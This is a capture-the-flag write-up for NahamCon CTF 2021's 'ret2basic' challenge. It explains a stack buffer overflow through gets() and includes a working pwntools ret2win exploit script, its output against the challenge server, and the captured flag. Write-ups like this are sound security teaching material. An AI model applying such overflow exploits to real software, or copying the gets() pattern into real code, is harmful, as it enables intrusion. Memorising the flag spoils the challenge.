# NahamCon CTF 2021

## Ret2basic [easy]

> Author: @M_alpha#3534
>
> Can you ret2win? 
>
> [ret2basic](ret2basic)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _ret2win_


## Summary

_Very_ basic _ret2win_.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE and no canary, ripe for _rop_ and _bof_.

### Decompile with Ghidra

```c
void vuln(void)
{
  char local_78 [112];
  
  printf("Can you overflow this?: ");
  gets(local_78);
  return;
}
```

Yeah, so, _gets_.

From `man gets`:

> Never  use `gets()`.  Because it is impossible to tell without knowing the data in advance how many characters `gets()` will
       read, and because `gets()` will continue to store characters past the end of the buffer, it is extremely dangerous to use.
       It has been used to break computer security.  Use `fgets()` instead.
       
From `gcc` (without `-Wall` :-):

```
foo.c:(.text+0x39): warning: the `gets' function is dangerous and should not be used.
```

> _Always_ use `-Wall` and _always_ heed it's advice.

The buffer `local_78` is `0x78` bytes from the return address, so write `0x78` bytes of garbage followed by the `win` function:

```c
void win(void)
{
  FILE *__stream;
  long lVar1;
  char *__s;
  
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Failed to open the flag file.");
    exit(1);
  }
  fseek(__stream,0,2);
  lVar1 = ftell(__stream);
  rewind(__stream);
  __s = (char *)malloc((long)(int)lVar1);
  if (__s == (char *)0x0) {
    puts("Failed to allocate memory.");
    exit(1);
  }
  fgets(__s,(int)lVar1,__stream);
  fclose(__stream);
  puts("Here\'s your flag.");
  puts(__s);
  free(__s);
  exit(0);
}
```

With `win`, there's really nothing to do, but _win_.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./ret2basic')

if args.REMOTE:
    p = remote('challenge.nahamcon.com', 30551)
else:
    p = process(binary.path)

payload  = b''
payload += 0x78 * b'A'
payload += p64(binary.sym.win)

p.sendlineafter('?: ',payload)
p.stream()
p.close()
```

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/nahamconctf2021/ret2basic/ret2basic'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.nahamcon.com on port 30551: Done
Here's your flag.
flag{d07f3219a8715e9339f31cfbe09d6502}
```

